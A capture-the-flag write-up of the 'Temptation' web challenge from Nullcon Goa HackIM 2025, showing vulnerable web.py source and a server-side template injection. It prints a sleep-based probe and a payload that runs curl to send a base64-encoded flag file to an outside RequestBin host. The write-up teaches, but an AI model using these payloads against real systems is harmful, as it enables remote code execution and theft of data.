---
title: "Temptation - Nullcon Goa HackIM 2025 CTF"
category: "web"
subcategory: "ssti"
type: "writeup"
tags: ["web", "template-injection", "python", "ssti", "base64", "os-system", "nullcon-goa-hackim-2025-ctf", "2025", "ctf-writeup"]
summary: "The \"Temptation\" challenge is a web application security exercise focusing on template injection vulnerabilities in Python web applications."
source:
  name: "CTFtime writeup #40422"
  url: "https://ctftime.org/writeup/40422"
original_source: "https://blog.hitc.at/posts/ctf/nullcon-hackim-ctf-goa-2025/temptation/"
ctf:
  name: "Nullcon Goa HackIM 2025 CTF"
  year: 2025
  challenge: "Temptation"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2025 CTF
- **Task:** Temptation
- **Author team:** fish3r
- **CTFtime tags:** web, template-injection, python
- **CTFtime:** <https://ctftime.org/writeup/40422>
- **Original writeup:** <https://blog.hitc.at/posts/ctf/nullcon-hackim-ctf-goa-2025/temptation/>

---
## Introduction

### Context Explanation  
The "Temptation" challenge is a web application security exercise focusing on template injection vulnerabilities in Python web applications.

![Temptation home](<https://blog.hitc.at/images/nullcon/web/temptation_home.png>)

### Directive  
The goal is to retrieve a flag by exploiting vulnerabilities in the web application.

## Solution

### Analyzing source code  
First, we need to retrieve the application's source code. The webpage contains a hidden comment suggesting to look at `/?source`.

```html   
<html>  
<head>  
<title>Temptation</title>   
</head>  
<body>  
<h1>Temptation challenge</h1>  
<form action="/" method="POST">  
<table>  
<tr>  
<th>  
<label for="temptation">What is your temptation?</label>  
</th>  
<td>  
<input id="temptation" name="temptation" type="password"/>  
</td>  
</tr>  
<tr>  
<th>  
<label for="submit"></label>  
</th>  
<td>  
<button id="submit" name="submit">submit</button>  
</td>  
</tr>  
</table>  
</form>  
  
</body>  
</html>  
```

However, directly accessing this path doesn't reveal anything.  
After testing different inputs, we discover that adding any parameter value (e.g., `/?source=anything`) reveals the source code.

```python

import web  
from web import form  
web.config.debug = False  
urls = (  
'/', 'index'  
)  
app = web.application(urls, locals())  
render = web.template.render('templates/')  
FLAG = open("/tmp/flag.txt").read()

temptation_Form = form.Form(  
form.Password("temptation", description="What is your temptation?"),  
form.Button("submit", type="submit", description="Submit")  
)

class index:  
def GET(self):  
try:  
i = web.input()  
if i.source:  
return open(__file__).read()  
except Exception as e:  
pass  
f = temptation_Form()  
return render.index(f)

def POST(self):  
f = temptation_Form()  
if not f.validates():  
return render.index(f)  
i = web.input()  
temptation = i.temptation  
if 'flag' in temptation.lower():  
return "Too tempted!"  
try:  
temptation = web.template.Template(f"Your temptation is: {temptation}")()  
except Exception as e:  
return "Too tempted!"  
if str(temptation) == "FLAG":  
return FLAG  
else:  
return "Too tempted!"  
application = app.wsgifunc()  
if __name__ == "__main__":  
app.run()  
```

The source code analysis reveals several key points:  
\- The application uses the `[web.py](http://web.py)` framework  
\- The flag is stored in `/tmp/flag.txt`  
\- A form asks for a "temptation" input  
\- Multiple security checks are implemented:

```python  
if 'flag' in temptation.lower():  
return "Too tempted!"  
```

```python  
if str(temptation) == "FLAG":  
return FLAG  
```

The interesting part is the template string evaluation using `web.template.Template()` with an f-string, which is vulnerable to Python code injection.

```python  
temptation = web.template.Template(f"Your temptation is: {temptation}")()  
```

### Exploitation  
The vulnerability lies in the template processing. While the application prevents using the word `flag` directly and requires the final output to be `FLAG`, we can bypass these restrictions using template injection.

1\. First, we confirm the vulnerability using a time-based payload:  
```python  
${__import__('os').system('sleep 5')}  
```  
![Confirming 5s sleep](<https://blog.hitc.at/images/nullcon/web/temptation_sleep.png>)

#### Access to the flag  
2\. After confirming the RCE capability, we craft a payload to exfiltrate the flag:  
```python  
${__import__('os').system('curl <https://eohs7zi0yztnmqq.m.pipedream.net/$(cat> /tmp/f*.txt | base64)')}  
```

This payload:  
\- Uses `os.system()` to execute shell commands  
\- Reads the flag file using `cat` with a wildcard to avoid using "flag" in the payload  
\- Base64 encodes the content to ensure safe transmission  
\- Exfiltrates the data using `curl` to a RequestBin endpoint

![Requestbin request received](<https://blog.hitc.at/images/nullcon/web/temptation_requestbin.png>)

3\. Decoding the received base64 string:  
```bash  
echo 'RU5Pe1QzTV9QbDRUXzNTXzRyM19TM2NVcmUhIX0=' | base64 -d  
ENO{T3M_Pl4T_3S_4r3_S3cUre!!}  
```
